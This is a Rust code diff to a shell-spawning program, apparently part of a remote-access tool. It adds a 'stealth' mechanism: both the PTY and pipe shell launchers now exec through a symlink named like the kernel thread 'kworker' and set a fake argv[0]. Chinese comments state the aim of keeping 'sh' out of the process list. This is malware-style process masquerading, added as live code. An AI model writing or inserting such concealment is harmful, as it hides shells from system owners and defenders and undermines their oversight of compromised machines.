@@ -2,6 +2,7 @@
 
 use std::collections::HashMap;
 use std::io::{Read, Write};
+use std::os::unix::process::CommandExt;
 use std::path::Path;
 use std::process::{Child, ChildStdin, Command, Stdio};
 use std::sync::atomic::{AtomicU32, Ordering};
@@ -153,9 +154,15 @@ fn spawn_pty(dir: &str) -> Result<Box<Pty>> {
         .find(|(k, _)| k == "PATH")
         .map(|(_, v)| v.as_str())
         .unwrap_or("");
-    let resolved = resolve_program(crate::defs::SHELL_PATH, path_env)
-        .with_context(|| format!("在 PATH={path_env} 里找不到 {}", crate::defs::SHELL_PATH))?;
+    // 伪装：exec 的文件名决定 /proc/pid/comm，argv[0] 决定 cmdline。
+    // 用 BINARY_DIR 下那个 kworker 之类的软链去 exec，进程列表里就看不到 sh。
+    let (stealth_shell, stealth_name) = crate::stealth::stealth_shell();
+    let shell_path = stealth_shell.display().to_string();
+    let resolved = resolve_program(&shell_path, path_env)
+        .or_else(|| resolve_program(crate::defs::SHELL_PATH, path_env))
+        .with_context(|| format!("在 PATH={path_env} 里找不到 {shell_path}"))?;
     let program = CString::new(resolved)?;
+    let argv0 = CString::new(stealth_name)?;
     let interactive = CString::new("-i")?;
     let workdir = CString::new(dir)?;
     let root = CString::new("/")?;
@@ -240,7 +247,7 @@ fn spawn_pty(dir: &str) -> Result<Box<Pty>> {
                 if libc::chdir(workdir.as_ptr()) != 0 {
                     libc::chdir(root.as_ptr());
                 }
-                let argv = [program.as_ptr(), interactive.as_ptr(), std::ptr::null()];
+                let argv = [argv0.as_ptr(), interactive.as_ptr(), std::ptr::null()];
                 libc::execve(program.as_ptr(), argv.as_ptr(), envp.as_ptr());
                 libc::_exit(127);
             }
@@ -273,7 +280,9 @@ fn spawn_pty(dir: &str) -> Result<Box<Pty>> {
 }
 
 fn spawn_pipe(dir: &str, output: &Arc<Mutex<Output>>) -> Result<Backend> {
-    let mut cmd = Command::new(crate::defs::SHELL_PATH);
+    let (shell, argv0) = crate::stealth::stealth_shell();
+    let mut cmd = Command::new(&shell);
+    cmd.arg0(argv0);
     // 先清空再注入，宿主环境一点不漏。
     cmd.env_clear();
     for (k, v) in shell_env(dir) {
